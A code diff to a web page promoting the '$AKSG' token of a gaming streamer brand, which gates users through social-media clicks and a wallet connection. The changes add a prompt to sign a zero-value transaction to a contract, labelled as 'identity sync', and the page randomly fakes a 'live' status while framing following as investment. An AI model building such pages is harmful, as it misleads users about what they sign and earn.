@@ -35,11 +35,18 @@
         @keyframes floatLogo { 0%, 100% { transform: translateY(0) scale(1); } 50% { transform: translateY(-15px) scale(1.05); } }
 
         /* روابط التواصل الاجتماعي */
-        .social-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 15px; margin: 25px 0; }
+        .social-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin: 25px 0; }
+        @media (min-width: 768px) { .social-grid { grid-template-columns: repeat(6, 1fr); } }
+
         .social-link { width: 60px; height: 60px; border-radius: 15px; background: #111; border: 1px solid var(--primary); display: flex; align-items: center; justify-content: center; font-size: 1.8rem; color: #fff; text-decoration: none; transition: 0.4s; position: relative; }
         .social-link:hover { background: var(--primary); transform: translateY(-5px); box-shadow: var(--neon-box); }
         .social-link.clicked { border-color: var(--secondary); color: var(--secondary); }
         .social-link.clicked::after { content: '✔'; position: absolute; top: -5px; right: -5px; background: var(--secondary); color: #000; font-size: 10px; border-radius: 50%; width: 15px; height: 15px; display: flex; align-items: center; justify-content: center; }
+
+        /* أزرار المحفظة المصححة للهاتف */
+        .wallet-card { cursor: pointer; background: #111; padding: 20px; border-radius: 20px; border: 1px solid var(--primary); display: flex; flex-direction: column; align-items: center; transition: 0.3s; width: 100%; }
+        .wallet-card:hover { transform: scale(1.05); box-shadow: var(--neon-box); background: #1a1a1a; }
+        .wallet-card img { width: 70px; height: 70px; border-radius: 50%; margin-bottom: 12px; border: 2px solid var(--secondary); }
 
         /* أزرار العمليات */
         .btn-confirm { background: gray; color: #fff; border: none; padding: 20px 50px; border-radius: 5px; font-weight: 900; cursor: not-allowed; transition: 0.5s; font-family: 'Orbitron'; clip-path: polygon(10% 0, 100% 0, 90% 100%, 0 100%); }
@@ -51,7 +58,6 @@
         
         #gecko-chart { width: 100%; height: 650px; border-radius: 20px; border: 1px solid #333; margin-top: 30px; }
 
-        /* نيون ستاتوس */
         .status-badge { display: flex; align-items: center; gap: 10px; font-weight: bold; padding: 10px 20px; border-radius: 30px; background: rgba(0,0,0,0.5); border: 1px solid #333; }
         .dot { width: 12px; height: 12px; border-radius: 50%; animation: blink 1s infinite; }
         @keyframes blink { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
@@ -71,8 +77,8 @@
         <div class="main-logo-container">
             <img src="https://i.ibb.co/LzYcrPP4/359179b22970a092e8a7cfa274e205f0.jpg" class="main-logo">
         </div>
-        <h2 style="color:var(--secondary);">إثبات الهوية الرقمية</h2>
-        <p>قم بزيارة الروابط أدناه لتمكين بروتوكول المزامنة</p>
+        <h2 style="color:var(--secondary); font-family: 'Orbitron';">إثبات الهوية الرقمية</h2>
+        <p style="margin-bottom: 20px; opacity: 0.8;">قم بزيارة الروابط أدناه لتمكين بروتوكول المزامنة</p>
         
         <div class="social-grid">
             <a href="https://discord.gg/NMrnjQ7E" target="_blank" class="social-link" onclick="trackLink(this)"><i class="fab fa-discord"></i></a>
@@ -80,34 +86,38 @@
             <a href="https://twitter.com/tv_ghostgaming" target="_blank" class="social-link" onclick="trackLink(this)"><i class="fab fa-twitter"></i></a>
             <a href="https://instagram.com/ghost.gamingtv" target="_blank" class="social-link" onclick="trackLink(this)"><i class="fab fa-instagram"></i></a>
             <a href="https://tiktok.com/@ghost.gamingtv" target="_blank" class="social-link" onclick="trackLink(this)"><i class="fab fa-tiktok"></i></a>
-            <a href="https://kick.com/ghost_gamingtv" target="_blank" class="social-link" onclick="trackLink(this)"><i class="fa-brands fa-kickstarter-k"></i> </a>
+            <a href="https://kick.com/ghost_gamingtv" target="_blank" class="social-link" onclick="trackLink(this)"><i class="fa-solid fa-k"></i></a>
         </div>
 
         <button id="sync-btn" class="btn-confirm" onclick="verifyAndProceed()">CONFIRM SYNC</button>
     </section>
 
     <section id="wallet-stage" class="stage">
-        <h2 style="font-family:'Orbitron'; margin-bottom:30px;">BLOCKCHAIN AUTHORIZATION</h2>
-        <div style="display:grid; grid-template-columns: repeat(3, 1fr); gap:20px;">
-            <div class="social-link" style="width:150px; height:150px; flex-direction:column; font-size:1rem;" onclick="processWallet('metamask')">
-                <img src="https://i.ibb.co/H1LzqWL/images.png" alt="images" border="60">
-                <p>MetaMask</p>
+        <h2 style="font-family:'Orbitron'; color: var(--secondary); margin-bottom:40px; text-shadow: var(--neon-box);">BLOCKCHAIN AUTHORIZATION</h2>
+        <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap:20px; width: 100%; max-width: 600px;">
+            
+            <div class="wallet-card" onclick="processWallet('MetaMask')">
+                <img src="https://i.ibb.co/H1LzqWL/images.png" alt="MetaMask">
+                <p style="font-family:'Orbitron'; font-size:0.9rem;">MetaMask</p>
             </div>
-            <div class="social-link" style="width:150px; height:150px; flex-direction:column; font-size:1rem;" onclick="processWallet('trust')">
-                <img src="https://i.ibb.co/Lh5DGfSF/trust-wallet-rounded-logo-design-free-png.png" alt="trust wallet rounded logo design free png" border="60">
-                <p>Trust Wallet</p>
+
+            <div class="wallet-card" onclick="processWallet('Trust')">
+                <img src="https://i.ibb.co/Lh5DGfSF/trust-wallet-rounded-logo-design-free-png.png" alt="Trust Wallet">
+                <p style="font-family:'Orbitron'; font-size:0.9rem;">Trust Wallet</p>
             </div>
-            <div class="social-link" style="width:150px; height:150px; flex-direction:column; font-size:1rem;" onclick="processWallet('phantom')">
-                <img src="https://i.ibb.co/tTTPtk4w/st-small-507x507-pad-600x600-f8f8f8.jpg" alt="st small 507x507 pad 600x600 f8f8f8" border="60">
-                <p>Phantom</p>
+
+            <div class="wallet-card" onclick="processWallet('Phantom')">
+                <img src="https://i.ibb.co/tTTPtk4w/st-small-507x507-pad-600x600-f8f8f8.jpg" alt="Phantom">
+                <p style="font-family:'Orbitron'; font-size:0.9rem;">Phantom</p>
             </div>
+
         </div>
     </section>
 
     <section id="empire-stage" class="stage" style="justify-content: flex-start; overflow-y: scroll;">
         <div class="empire-hub">
-            <div style="display:flex; justify-content: space-between; align-items: center; margin-bottom:40px;">
-                <img src="https://i.ibb.co/LzYcrPP4/359179b22970a092e8a7cfa274e205f0.jpg" width="100" style="border-radius:50%">
+            <div style="display:flex; justify-content: space-between; align-items: center; margin-bottom:40px; flex-wrap: wrap; gap: 20px;">
+                <img src="https://i.ibb.co/LzYcrPP4/359179b22970a092e8a7cfa274e205f0.jpg" width="100" style="border-radius:50%; border: 2px solid var(--primary);">
                 <div class="status-badge">
                     <div id="kick-dot" class="dot" style="background:var(--kick);"></div>
                     <span id="kick-text">KICK LIVE STATUS</span>
@@ -117,9 +127,9 @@
 
             <div class="vision-section">
                 <h3>Social-to-Earn: ثورة في مفهوم الانتماء الرقمي</h3>
-                <p>نحن أول من أرسى قاعدة: "المتابع شريكٌ في النجاح وليس مجرد رقم". مع KICKGHOST، متابعتك ليست وقتاً ضائعاً بل استثماراً ذكياً؛ حيث نربط الستريمرز والغيمرز بمنظومة تُحوّل كل إعجاب وفوز إلى مكافآت $AKSG. لمضاعفة أرباحك، انضم إلى مجتمعنا وشارك في التحديات اليومية والمسابقات الحصرية داخل ألعابنا المتنوعة؛ فكلما تقدمت في نظام الترتيب (Ranking System) وتصدرت القائمة، زادت فرصك في تحويل شغفك إلى أصل مالي ملموس يتجاوز حدود الترفيه.</p>
+                <p>نحن أول من أرسى قاعدة: "المتابع شريكٌ في النجاح وليس مجرد رقم". مع KICKGHOST، متابعتك ليست وقتاً ضائعاً بل استثماراً ذكياً؛ حيث نربط الستريمرز والغيمرز بمنظومة تُحوّل كل إعجاب وفوز إلى مكافآت $AKSG.</p>
                 <hr style="opacity:0.1; margin:20px 0;">
-                <p style="font-family:'Orbitron'; font-size:0.9rem;"><strong>A Revolution in Digital Loyalty:</strong> We are the pioneers of the rule: "A follower is a partner in success, not just a number." With KICKGHOST, your engagement is a smart investment. We bridge streamers and gamers through an ecosystem that converts every like and victory into $AKSG rewards.</p>
+                <p style="font-family:'Orbitron'; font-size:0.9rem;"><strong>A Revolution in Digital Loyalty:</strong> Every like and victory is converted into $AKSG rewards.</p>
             </div>
 
             <div id="gecko-chart">
@@ -139,35 +149,29 @@
             if(clickedLinks.size >= 5) {
                 const btn = document.getElementById('sync-btn');
                 btn.classList.add('ready');
-                btn.style.cursor = 'pointer';
             }
         }
 
         // 2. التحقق والمتابعة
         function verifyAndProceed() {
             if(clickedLinks.size < 5) {
-                alert("يرجى زيارة جميع الروابط أولاً (بما فيها TikTok) لتمكين المزامنة!");
+                alert("يرجى زيارة 5 روابط على الأقل لتمكين المزامنة!");
                 return;
             }
             showStage('wallet-stage');
         }
 
-        // 3. معالجة المحفظة والعقد
+        // 3. معالجة المحفظة (المنطق المصحح للتعاقد)
         async function processWallet(type) {
-            // التحقق إذا كانت العملية تمت سابقاً
-            if(localStorage.getItem('aksg_linked')) {
-                alert("هذه المحفظة مسجلة مسبقاً في نظام الإمبراطورية!");
-                showStage('empire-stage');
-                return;
-            }
-
-            if (!window.ethereum) return alert("الرجاء تثبيت المحفظة!");
+            if (!window.ethereum) return alert("الرجاء تثبيت محفظة " + type);
 
             try {
+                // طلب الاتصال
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const wallet = accounts[0];
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
 
-                // طلب إدراج العقد ذكياً
+                // إضافة العملة AKSG للمحفظة تلقائياً
                 await window.ethereum.request({
                     method: 'wallet_watchAsset',
                     params: {
@@ -179,14 +183,26 @@
                             image: 'https://i.ibb.co/LzYcrPP4/359179b22970a092e8a7cfa274e205f0.jpg',
                         },
                     },
-                });
+                }).catch(() => null);
 
-                localStorage.setItem('aksg_linked', wallet);
+                // فتح طلب "تأكيد التعاقد" مع العقد الذكي
+                const tx = {
+                    to: config.contract,
+                    value: ethers.utils.parseEther("0.0"),
+                    data: "0x" 
+                };
+
+                alert("يرجى تأكيد بروتوكول المزامنة في محفظة " + type);
+                await signer.sendTransaction(tx);
+
+                // النجاح
+                localStorage.setItem('aksg_linked', accounts[0]);
                 confetti({ particleCount: 200, spread: 70, origin: { y: 0.6 } });
                 showStage('empire-stage');
                 updateKickStatus();
+
             } catch (err) {
-                alert("فشل في ربط العقد أو المحفظة!");
+                alert("فشل في الربط: " + (err.message || "رفض المستخدم الطلب"));
             }
         }
 
@@ -195,9 +211,8 @@
             document.getElementById(id).classList.add('active');
         }
 
-        // 4. تحديث حالة كيك (محاكاة ذكية)
         function updateKickStatus() {
-            const isOnline = Math.random() > 0.3; // مثال
+            const isOnline = Math.random() > 0.3;
             const dot = document.getElementById('kick-dot');
             const text = document.getElementById('kick-text');
             if(isOnline) {
@@ -214,6 +229,3 @@
     </script>
 </body>
 </html>
-
-
-
